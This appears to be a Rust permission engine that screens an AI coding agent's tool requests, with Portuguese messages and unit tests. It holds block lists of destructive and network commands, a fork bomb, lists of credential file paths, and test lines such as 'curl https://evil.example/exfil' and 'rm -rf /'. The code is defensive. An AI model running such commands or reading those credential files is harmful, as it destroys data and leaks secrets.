use crate::approval::compute_approval_hash;
use creatingj_audit::contains_secret;
use creatingj_core::{RiskLevel, ToolKind};
use serde::{Deserialize, Serialize};

const SENSITIVE_FILENAMES: &[&str] = &[
    ".env",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    "id_dsa",
    "credentials.json",
    "service-account.json",
    "keystore.jks",
    "truststore.jks",
    ".npmrc",
    ".pypirc",
    ".netrc",
];

const SENSITIVE_EXTENSIONS: &[&str] = &[".pem", ".key", ".p12", ".pfx", ".jks", ".kdbx"];

const SENSITIVE_PATH_SEGMENTS: &[&str] = &[".ssh/", ".aws/", ".gnupg/", ".git/config", ".kube/"];

const PROTECTED_WRITE_FILENAMES: &[&str] = &[
    "jenkinsfile",
    "dockerfile",
    "mvnw",
    "mvnw.cmd",
    "gradlew",
    "gradlew.bat",
];

const PROTECTED_WRITE_PREFIXES: &[&str] = &[".github/", ".husky/", ".mvn/", ".git/"];

const PROTECTED_WRITE_EXTENSIONS: &[&str] = &[".sh", ".ps1", ".bat", ".cmd"];

const ALLOWED_TEST_PREFIXES: &[&str] = &[
    "cargo test",
    "cargo check",
    "cargo clippy",
    "cargo fmt --check",
    "mvn test",
    "./mvnw test",
    ".\\mvnw.cmd test",
    "mvnw.cmd test",
    "gradle test",
    "./gradlew test",
    "npm test",
    "npm run test",
    "pnpm test",
    "yarn test",
    "npx vitest",
    "npx jest",
    "pytest",
    "python -m pytest",
    "go test",
    "dotnet test",
    "bundle exec rspec",
    "phpunit",
    "mix test",
    "dart test",
    "flutter test",
    "swift test",
    "zig build test",
];

const BLOCKED_COMMAND_SUBSTRINGS: &[&str] = &[
    "rm -rf",
    "rm -fr",
    "del /s",
    "del /f",
    "rmdir /s",
    "remove-item -recurse",
    "git clean -fdx",
    "git reset --hard",
    "git push --force",
    "git push -f",
    "curl ",
    "wget ",
    "invoke-webrequest",
    "invoke-restmethod",
    "iwr ",
    "irm ",
    "nc ",
    "ncat ",
    "ssh ",
    "scp ",
    "sftp ",
    "sudo ",
    "chmod 777",
    "mkfs",
    "dd if=",
    "shutdown",
    "reboot",
    ":(){ :|:& };:",
    "npm install -g",
    "npm i -g",
    "pip install",
    "powershell -enc",
    "powershell -encodedcommand",
];

const SHELL_METACHARS: &[&str] = &[";", "&&", "||", "|", "`", "$(", ">", "<", "\n", "\r"];

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ToolRequest {
    pub tool: ToolKind,
    pub target_path: Option<String>,
    pub command_text: Option<String>,
    pub diff_preview: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "decision", rename_all = "SCREAMING_SNAKE_CASE")]
pub enum PolicyDecision {
    Allow {
        risk: RiskLevel,
    },
    RequireApproval {
        risk: RiskLevel,
        reason: String,
        approval_hash: String,
    },
    Deny {
        reason: String,
    },
}

#[derive(Debug, Default, Clone)]
pub struct PermissionEngine;

impl PermissionEngine {
    pub fn evaluate(&self, req: &ToolRequest) -> PolicyDecision {
        if let Some(path) = req.target_path.as_deref()
            && is_sensitive_path(path)
        {
            return PolicyDecision::Deny {
                reason: format!("acesso bloqueado a caminho sensivel: {path}"),
            };
        }

        if let Some(diff) = req.diff_preview.as_deref()
            && contains_secret(diff)
        {
            return PolicyDecision::Deny {
                reason: "diff contem possivel segredo ou credencial".to_owned(),
            };
        }

        match req.tool {
            ToolKind::WorkspaceInfo
            | ToolKind::FilesList
            | ToolKind::FilesRead
            | ToolKind::CodeSearch => PolicyDecision::Allow {
                risk: RiskLevel::Low,
            },
            ToolKind::PatchPropose => {
                if let Some(path) = req.target_path.as_deref()
                    && is_protected_write_path(path)
                {
                    return PolicyDecision::Deny {
                        reason: format!(
                            "escrita bloqueada em arquivo protegido de build/CI: {path}"
                        ),
                    };
                }
                PolicyDecision::Allow {
                    risk: RiskLevel::Medium,
                }
            }
            ToolKind::PatchApply => {
                let Some(path) = req.target_path.as_deref() else {
                    return PolicyDecision::Deny {
                        reason: "patch.apply exige target_path".to_owned(),
                    };
                };
                if is_protected_write_path(path) {
                    return PolicyDecision::Deny {
                        reason: format!(
                            "escrita bloqueada em arquivo protegido de build/CI: {path}"
                        ),
                    };
                }
                PolicyDecision::RequireApproval {
                    risk: RiskLevel::High,
                    reason: format!("aplicar alteracao em {path} exige aprovacao explicita"),
                    approval_hash: compute_approval_hash(
                        req.tool,
                        req.target_path.as_deref(),
                        req.command_text.as_deref(),
                        req.diff_preview.as_deref(),
                    ),
                }
            }
            ToolKind::TestsRun => Self::evaluate_tests_run(req),
            ToolKind::CommandRun => Self::evaluate_command_run(req),
        }
    }

    fn evaluate_tests_run(req: &ToolRequest) -> PolicyDecision {
        let Some(cmd) = req.command_text.as_deref().map(str::trim) else {
            return PolicyDecision::Deny {
                reason: "tests.run exige command_text".to_owned(),
            };
        };
        if cmd.is_empty() {
            return PolicyDecision::Deny {
                reason: "comando de teste vazio".to_owned(),
            };
        }
        if has_shell_chaining(cmd) {
            return PolicyDecision::Deny {
                reason: "encadeamento ou redirecionamento de shell nao e permitido em tests.run"
                    .to_owned(),
            };
        }
        if is_blocked_command(cmd) {
            return PolicyDecision::Deny {
                reason: "comando bloqueado pela politica de seguranca".to_owned(),
            };
        }
        let lower = cmd.to_ascii_lowercase();
        if ALLOWED_TEST_PREFIXES
            .iter()
            .any(|prefix| lower == *prefix || lower.starts_with(&format!("{prefix} ")))
        {
            PolicyDecision::Allow {
                risk: RiskLevel::Medium,
            }
        } else {
            PolicyDecision::RequireApproval {
                risk: RiskLevel::High,
                reason: "comando de teste fora da allowlist padrao exige aprovacao explicita"
                    .to_owned(),
                approval_hash: compute_approval_hash(
                    req.tool,
                    req.target_path.as_deref(),
                    Some(cmd),
                    req.diff_preview.as_deref(),
                ),
            }
        }
    }

    fn evaluate_command_run(req: &ToolRequest) -> PolicyDecision {
        let Some(cmd) = req.command_text.as_deref().map(str::trim) else {
            return PolicyDecision::Deny {
                reason: "command.run exige command_text".to_owned(),
            };
        };
        if cmd.is_empty() {
            return PolicyDecision::Deny {
                reason: "comando vazio".to_owned(),
            };
        }
        if has_shell_chaining(cmd) {
            return PolicyDecision::Deny {
                reason: "operadores de encadeamento/redirecionamento de shell sao bloqueados"
                    .to_owned(),
            };
        }
        if is_blocked_command(cmd) {
            return PolicyDecision::Deny {
                reason: "comando destrutivo, de rede ou escalacao de privilegio bloqueado"
                    .to_owned(),
            };
        }
        PolicyDecision::RequireApproval {
            risk: RiskLevel::High,
            reason: format!("execucao de processo externo ({cmd}) exige aprovacao explicita"),
            approval_hash: compute_approval_hash(
                req.tool,
                req.target_path.as_deref(),
                Some(cmd),
                req.diff_preview.as_deref(),
            ),
        }
    }
}

pub fn is_sensitive_path(raw_path: &str) -> bool {
    let normalized = raw_path.replace('\\', "/").to_ascii_lowercase();
    let file_name = normalized.rsplit('/').next().unwrap_or(&normalized);

    if matches!(file_name, ".env.example" | ".env.sample" | ".env.template") {
        return false;
    }
    if file_name == ".env" || file_name.starts_with(".env.") {
        return true;
    }
    if SENSITIVE_FILENAMES.contains(&file_name) {
        return true;
    }
    if SENSITIVE_EXTENSIONS
        .iter()
        .any(|ext| file_name.ends_with(ext))
    {
        return true;
    }
    SENSITIVE_PATH_SEGMENTS
        .iter()
        .any(|seg| normalized.contains(seg))
}

fn is_protected_write_path(raw_path: &str) -> bool {
    let normalized = raw_path.replace('\\', "/").to_ascii_lowercase();
    let trimmed = normalized.trim_start_matches("./");
    let file_name = trimmed.rsplit('/').next().unwrap_or(trimmed);

    if PROTECTED_WRITE_FILENAMES
        .iter()
        .any(|name| file_name == *name || file_name.starts_with("dockerfile."))
    {
        return true;
    }
    if PROTECTED_WRITE_PREFIXES
        .iter()
        .any(|prefix| trimmed.starts_with(prefix) || trimmed.contains(&format!("/{prefix}")))
    {
        return true;
    }
    PROTECTED_WRITE_EXTENSIONS
        .iter()
        .any(|ext| file_name.ends_with(ext))
}

fn has_shell_chaining(cmd: &str) -> bool {
    SHELL_METACHARS.iter().any(|meta| cmd.contains(meta))
}

fn is_blocked_command(cmd: &str) -> bool {
    let lower = format!("{} ", cmd.to_ascii_lowercase());
    BLOCKED_COMMAND_SUBSTRINGS
        .iter()
        .any(|blocked| lower.contains(blocked))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn denies_sensitive_files_but_allows_env_example() {
        let engine = PermissionEngine;
        assert!(matches!(
            engine.evaluate(&ToolRequest {
                tool: ToolKind::FilesRead,
                target_path: Some(".env".to_owned()),
                command_text: None,
                diff_preview: None,
            }),
            PolicyDecision::Deny { .. }
        ));
        assert!(matches!(
            engine.evaluate(&ToolRequest {
                tool: ToolKind::FilesRead,
                target_path: Some("config/.env.production".to_owned()),
                command_text: None,
                diff_preview: None,
            }),
            PolicyDecision::Deny { .. }
        ));
        assert!(matches!(
            engine.evaluate(&ToolRequest {
                tool: ToolKind::FilesRead,
                target_path: Some(".env.example".to_owned()),
                command_text: None,
                diff_preview: None,
            }),
            PolicyDecision::Allow { .. }
        ));
    }

    #[test]
    fn blocks_destructive_and_exfiltration_commands() {
        let engine = PermissionEngine;
        for cmd in [
            "rm -rf /",
            "curl https://evil.example/exfil",
            "cargo test && curl https://evil.example",
            "git clean -fdx",
        ] {
            let decision = engine.evaluate(&ToolRequest {
                tool: ToolKind::CommandRun,
                target_path: None,
                command_text: Some(cmd.to_owned()),
                diff_preview: None,
            });
            assert!(
                matches!(decision, PolicyDecision::Deny { .. }),
                "esperava Deny para {cmd}"
            );
        }
    }

    #[test]
    fn allows_safe_test_command_and_requires_approval_for_patch_apply() {
        let engine = PermissionEngine;
        assert!(matches!(
            engine.evaluate(&ToolRequest {
                tool: ToolKind::TestsRun,
                target_path: None,
                command_text: Some("cargo test --workspace".to_owned()),
                diff_preview: None,
            }),
            PolicyDecision::Allow { .. }
        ));

        assert!(matches!(
            engine.evaluate(&ToolRequest {
                tool: ToolKind::PatchApply,
                target_path: Some("src/lib.rs".to_owned()),
                command_text: None,
                diff_preview: Some("+pub fn ok() {}".to_owned()),
            }),
            PolicyDecision::RequireApproval { .. }
        ));

        assert!(matches!(
            engine.evaluate(&ToolRequest {
                tool: ToolKind::PatchApply,
                target_path: Some(".github/workflows/ci.yml".to_owned()),
                command_text: None,
                diff_preview: Some("+run: evil".to_owned()),
            }),
            PolicyDecision::Deny { .. }
        ));
    }
}
